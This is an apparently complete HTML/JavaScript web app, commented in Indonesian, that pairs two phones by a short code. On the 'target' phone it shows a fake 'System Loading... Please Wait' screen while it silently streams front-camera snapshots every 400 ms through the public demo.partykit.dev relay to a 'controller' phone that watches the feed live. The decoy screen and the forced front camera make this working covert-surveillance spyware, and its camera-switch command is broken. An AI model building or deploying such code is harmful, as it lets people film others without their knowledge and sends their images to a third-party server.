<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Magic Remote Turbo</title>
    <style>
        * { box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; font-family: sans-serif; background: #1a1a1a; color: white; height: 100vh; overflow: hidden; }

        /* MENU */
        #menu-screen {
            position: absolute; top:0; left:0; width:100%; height:100%;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100;
        }
        .card { background: rgba(255,255,255,0.1); padding: 30px; border-radius: 20px; text-align: center; width: 80%; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); }
        h2 { margin-bottom: 20px; text-shadow: 0 0 10px rgba(0,255,255,0.5); }
        input { padding: 15px; width: 80%; font-size: 18px; border-radius: 10px; border: none; margin-bottom: 20px; text-align: center; background: rgba(255,255,255,0.9); color: #333; }
        .btn { padding: 15px 30px; font-size: 18px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; margin: 10px; width: 80%; transition: transform 0.1s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .btn:active { transform: scale(0.95); }
        .btn-mode-a { background: #ff4757; color: white; }
        .btn-mode-b { background: #2ed573; color: white; }

        /* TARGET SCREEN */
        #target-screen { display: none; height: 100%; }
        .decoy { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; background: #dfe6e9; color: #2d3436; }
        .token-box { position: fixed; top: 10px; right: 10px; background: #000; color: #00ff00; padding: 8px 12px; font-family: monospace; font-size: 12px; border-radius: 5px; z-index: 999; box-shadow: 0 0 10px #00ff00; border: 1px solid #00ff00; }
        video, canvas { display: none; }

        /* CONTROLLER SCREEN */
        #controller-screen { display: none; height: 100%; flex-direction: column; align-items: center; justify-content: center; background: #000; }
        #cam-feed { width: 95%; height: 50%; background: #111; border: 2px solid #444; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; border-radius: 10px; }
        #cam-feed img { width: 100%; height: 100%; object-fit: cover; }
        .loading-spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .controls-btn { width: 70px; height: 70px; border-radius: 50%; background: #2d3436; border: 2px solid #636e72; color: white; font-size: 24px; margin: 10px; }
        .controls-btn:active { background: #e74c3c; border-color: #c0392b; }
        .status-text { color: #00ff00; margin-top: 10px; font-family: monospace; font-size: 14px; text-shadow: 0 0 5px rgba(0,255,0,0.5); }

    </style>
</head>
<body>

    <!-- 1. MENU UTAMA -->
    <div id="menu-screen">
        <div class="card">
            <h2>âš¡ TURBO REMOTE</h2>
            <p style="font-size:12px; opacity:0.7;">Koneksi Super Cepat</p>
            
            <button class="btn btn-mode-b" onclick="startController()">ðŸ“± SAYA LIHAT (CONTROLLER)</button>
            <button class="btn btn-mode-a" onclick="startTarget()">ðŸ“· SAYA KAMERA (TARGET)</button>
        </div>
    </div>

    <!-- 2. LAYAR TARGET -->
    <div id="target-screen">
        <div class="token-box" id="token-display">...</div>
        
        <div class="decoy">
            <h1>System Loading...</h1>
            <p style="font-size:50px;">âŒ›</p>
            <p>Please Wait...</p>
        </div>
        <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>

        <video id="vid" autoplay playsinline muted></video>
        <canvas id="can" width="320" height="240"></canvas>
    </div>

    <!-- 3. LAYAR CONTROLLER -->
    <div id="controller-screen">
        <h2 style="margin-top:10px; color:white;">Monitor</h2>
        
        <input type="text" id="connect-id" placeholder="CODE..." style="background:#333; color:#00ff00; width:90%; border:1px solid #00ff00;">
        <button class="btn" style="width:auto; padding:10px 30px; background:#0984e3;" onclick="connectToTarget()">CONNECT</button>

        <div id="cam-feed">
            <div class="loading-spinner"></div>
        </div>
        <div class="status-text" id="status-log">STATUS: DISCONNECTED</div>

        <div style="display:flex; gap:10px;">
            <button class="controls-btn" onclick="sendCmd('SWITCH')">ðŸ”„</button>
            <button class="controls-btn" onclick="sendCmd('FLASH')">ðŸ“¸</button>
        </div>
    </div>

    <!-- ENGINE PARTYKIT (TURBO) -->
    <script type="module">
        import { PartySocket } from "https://cdn.jsdelivr.net/npm/partysocket@1.0.0/dist/partysocket.mjs";
        window.PartySocket = PartySocket;
    </script>

    <script>
        let socket = null;
        let myId = Math.random().toString(36).substr(2, 6).toUpperCase(); 
        let videoStream = null;
        let isFront = true;
        let connectionRoom = "";
        let isSending = false; // Mencegah spam

        // --- FUNGSI TARGET ---
        async function startTarget() {
            document.getElementById('menu-screen').style.display = 'none';
            document.getElementById('target-screen').style.display = 'block';
            
            document.getElementById('token-display').innerText = "CODE: " + myId;
            connectionRoom = "turbo-remote-" + myId;
            connectToParty(connectionRoom);

            await startCamera();
            // Mulai kirim gambar (Interval 400ms = Lebih Cepat dari sebelumnya)
            setInterval(captureAndSend, 400); 
            listenToCommands();
        }

        async function startCamera() {
            try {
                // PAKSA KAMERA DEPAN
                const constraints = { 
                    video: { facingMode: "user", width: 320, height: 240 }, 
                    audio: false 
                };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('vid').srcObject = videoStream;
            } catch(e) { alert("Kamera Gagal: " + e.message); }
        }

        function captureAndSend() {
            if (!socket || !videoStream) return;
            
            const canvas = document.getElementById('can');
            const ctx = canvas.getContext('2d');
            const vid = document.getElementById('vid');
            
            if (vid.readyState === 4) {
                ctx.drawImage(vid, 0, 0, 320, 240);
                // KOMPRES GAMBAR (Quality 0.3 = Sangat Ringan & Cepat)
                const dataUrl = canvas.toDataURL('image/jpeg', 0.3);
                
                // Kirim pesan JSON
                socket.send(JSON.stringify({ type: "video", data: dataUrl }));
            }
        }

        function listenToCommands() {
            socket.addEventListener('message', (event) => {
                try {
                    const msg = JSON.parse(event.data);
                    if (msg.type === "cmd") {
                        if (msg.data === "SWITCH") {
                            isFront = !isFront;
                            // Reload stream kamera
                            startCamera();
                        }
                        if (msg.data === "FLASH") {
                            document.body.style.background = "white";
                            setTimeout(() => document.body.style.background = "#dfe6e9", 100);
                        }
                    }
                } catch(e) {}
            });
        }

        // --- FUNGSI CONTROLLER ---
        function startController() {
            document.getElementById('menu-screen').style.display = 'none';
            document.getElementById('controller-screen').style.display = 'flex';
        }

        function connectToTarget() {
            const targetCode = document.getElementById('connect-id').value.toUpperCase();
            if (!targetCode) return alert("Masukkan Kode!");

            document.getElementById('status-log').innerText = "CONNECTING TO " + targetCode + "...";
            
            connectionRoom = "turbo-remote-" + targetCode;
            connectToParty(connectionRoom);

            // Listener Video
            socket.addEventListener('message', (event) => {
                try {
                    const msg = JSON.parse(event.data);
                    if (msg.type === "video") {
                        const feed = document.getElementById('cam-feed');
                        feed.innerHTML = `<img src="${msg.data}">`;
                        document.getElementById('status-log').innerText = "CONNECTED â€¢ LIVE";
                    }
                } catch(e) {}
            });
        }

        // --- JEMBATAN KONEKSI ---
        function connectToParty(roomName) {
            try {
                // Ganti host ke server Asia (Try-H) atau Demo Global
                socket = new PartySocket({
                    host: "demo.partykit.dev", 
                    room: roomName,
                });

                socket.addEventListener("open", () => {
                    console.log("Socket Open!");
                });

                socket.addEventListener("error", (err) => {
                    console.error("Socket Error", err);
                    document.getElementById('status-log').innerText = "ERROR CONNECTION";
                });

            } catch (err) {
                console.error("PartyKit Error", err);
                alert("Gagal koneksi server.");
            }
        }

        function sendCmd(cmd) {
            if (!socket) return;
            socket.send(JSON.stringify({ type: "cmd", data: cmd }));
        }

    </script>
</body>
</html>
